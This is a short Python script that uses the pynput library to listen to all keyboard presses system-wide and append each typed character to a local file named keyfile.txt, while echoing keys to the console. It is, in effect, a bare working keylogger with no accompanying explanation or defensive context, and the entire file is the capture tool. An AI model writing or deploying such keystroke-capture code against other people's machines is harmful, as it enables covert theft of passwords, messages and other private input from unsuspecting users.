from pynput import keyboard

def keybutton(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Errror to get char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keybutton)
    listener.start()
    input()